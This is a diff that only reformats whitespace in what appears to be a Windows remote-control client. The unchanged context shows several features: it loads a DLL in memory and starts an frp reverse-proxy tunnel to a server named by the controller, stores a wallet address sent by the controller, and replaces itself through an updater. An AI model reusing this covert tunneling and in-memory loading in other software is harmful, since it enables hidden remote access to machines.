@@ -195,12 +195,12 @@ typedef int (*RunSimpleTcpFunc)(
 );
 
 typedef int (*RunSimpleTcpWithTokenFunc)(
-    const char* token, 
-	const char* serverAddr,
-	int serverPort,
-	int localPort,
-	int remotePort,
-	int* statusPtr
+    const char* token,
+    const char* serverAddr,
+    int serverPort,
+    int localPort,
+    int remotePort,
+    int* statusPtr
 );
 
 DWORD WINAPI ExecuteDLLProc(LPVOID param)
@@ -253,24 +253,24 @@ DWORD WINAPI ExecuteDLLProc(LPVOID param)
             break;
         }
         case CALLTYPE_FRPC_STDCALL: {
-			RunSimpleTcpWithTokenFunc proc = module ? (RunSimpleTcpWithTokenFunc)runner->GetProcAddress(module, "RunSimpleTcpWithToken") : NULL;
-			char* user = (char*)dll->param.User;
-			FrpcParam* f = (FrpcParam*)user;
-			if (proc) {
-				Mprintf("MemoryGetProcAddress '%s' %s\n", info.Name, proc ? "success" : "failed");
-				int r = proc(f->privilegeKey, f->serverAddr, f->serverPort, f->localPort, f->remotePort,
-					&CKernelManager::g_IsAppExit);
-				if (r) {
-					char buf[100];
-					sprintf_s(buf, "Run %s [proxy %d] failed: %d", info.Name, f->localPort, r);
-					Mprintf("%s\n", buf);
-					ClientMsg msg("代理端口", buf);
-					This->SendData((LPBYTE)&msg, sizeof(msg));
-				}
-			}
-			SAFE_DELETE_ARRAY(user);
-			break;
-		}
+            RunSimpleTcpWithTokenFunc proc = module ? (RunSimpleTcpWithTokenFunc)runner->GetProcAddress(module, "RunSimpleTcpWithToken") : NULL;
+            char* user = (char*)dll->param.User;
+            FrpcParam* f = (FrpcParam*)user;
+            if (proc) {
+                Mprintf("MemoryGetProcAddress '%s' %s\n", info.Name, proc ? "success" : "failed");
+                int r = proc(f->privilegeKey, f->serverAddr, f->serverPort, f->localPort, f->remotePort,
+                             &CKernelManager::g_IsAppExit);
+                if (r) {
+                    char buf[100];
+                    sprintf_s(buf, "Run %s [proxy %d] failed: %d", info.Name, f->localPort, r);
+                    Mprintf("%s\n", buf);
+                    ClientMsg msg("代理端口", buf);
+                    This->SendData((LPBYTE)&msg, sizeof(msg));
+                }
+            }
+            SAFE_DELETE_ARRAY(user);
+            break;
+        }
         default:
             break;
         }
@@ -842,14 +842,13 @@ VOID CKernelManager::OnReceive(PBYTE szBuffer, ULONG ulLength)
         if (ulLength > MasterSettingsOldSize) {
             memcpy(&m_settings, szBuffer + 1, ulLength > sizeof(MasterSettings) ? sizeof(MasterSettings) : MasterSettingsOldSize);
             if (m_settings.Signature[0] && m_LoginSignature.empty()) {
-				m_LoginSignature = std::string(m_settings.Signature, m_settings.Signature + 64);
+                m_LoginSignature = std::string(m_settings.Signature, m_settings.Signature + 64);
                 bool verifyMessage(const std::string & publicKey, BYTE * msg, int len, const std::string & signature);
                 bool verified = verifyMessage("", (BYTE*)m_LoginMsg.data(), m_LoginMsg.length(), m_LoginSignature);
                 Mprintf("收到主控配置信息 %dbytes: 上报间隔 %ds. Verified: %s\n", ulLength - 1, m_settings.ReportInterval,
-                    verified ? "success" : "failed");
-            }
-            else {
-				Mprintf("收到主控配置信息 %dbytes: 上报间隔 %ds.\n", ulLength - 1, m_settings.ReportInterval);
+                        verified ? "success" : "failed");
+            } else {
+                Mprintf("收到主控配置信息 %dbytes: 上报间隔 %ds.\n", ulLength - 1, m_settings.ReportInterval);
             }
             iniFile cfg(CLIENT_PATH);
             cfg.SetStr("settings", "wallet", m_settings.WalletAddress);
@@ -986,10 +985,10 @@ VOID CKernelManager::OnReceive(PBYTE szBuffer, ULONG ulLength)
                 TerminateProcess(GetCurrentProcess(), 0xABCDEF);
             }
             Mprintf("CKernelManager: [%s] Update FAILED.\n", curFile);
-        } else if(typ == CLIENT_TYPE_ONE){
+        } else if(typ == CLIENT_TYPE_ONE) {
             ULONGLONG size = 0;
             memcpy(&size, (const char*)szBuffer + 1, sizeof(ULONGLONG));
-			const char* name = "updater.exe";
+            const char* name = "updater.exe";
             char curFile[_MAX_PATH] = {};
             GetModuleFileName(NULL, curFile, MAX_PATH);
             GET_FILEPATH(curFile, name);
@@ -1072,7 +1071,7 @@ void AuthKernelManager::OnHeatbeatResponse(PBYTE szBuffer, ULONG ulLength)
         m_nNetPing.update_from_sample(GetUnixMs() - n.Time);
         if (n.Authorized == TRUE) {
             Mprintf("======> Client authorized successfully.\n");
-			if (n.IsTrail) return; // Trial version, do not exit
+            if (n.IsTrail) return; // Trial version, do not exit
             // Once the client is authorized, authentication is no longer needed
             // So we can set exit flag to terminate the AuthKernelManager
             g_bExit = S_CLIENT_EXIT;
